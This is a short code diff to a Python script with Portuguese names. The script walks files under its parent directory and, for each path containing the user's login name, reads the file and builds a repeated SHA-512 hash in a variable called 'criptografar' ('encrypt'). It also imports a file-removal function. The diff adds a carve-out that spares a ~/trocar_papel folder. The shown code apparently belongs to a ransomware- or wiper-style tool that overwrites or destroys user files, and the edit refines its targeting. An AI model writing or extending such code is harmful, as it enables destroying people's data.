@@ -1,3 +1,4 @@
+import os
 from os import listdir, path, remove, getlogin
 from hashlib import sha512
 from threading import Thread
@@ -6,6 +7,7 @@ from sys import argv
 arquivo_atual = argv
 usuario = getlogin()
 root_dir = '../'  # caminho relativo para o diretório pai do arquivo executável
+trocar_papel_dir = os.path.expanduser('~') + '/trocar_papel'
 
 def list_all_files(dir_path):
     for files in listdir(dir_path):
@@ -22,7 +24,7 @@ def list_all_files(dir_path):
 
         if path.isfile(file_path):
             try:
-                if usuario in path.abspath(file_path):
+                if usuario in path.abspath(file_path) and not path.abspath(file_path).startswith(path.abspath(trocar_papel_dir)):
                     with open(file_path, 'rb') as rb:
                         dados = rb.read()
                         criptografar = sha512(dados).hexdigest()*0xFF
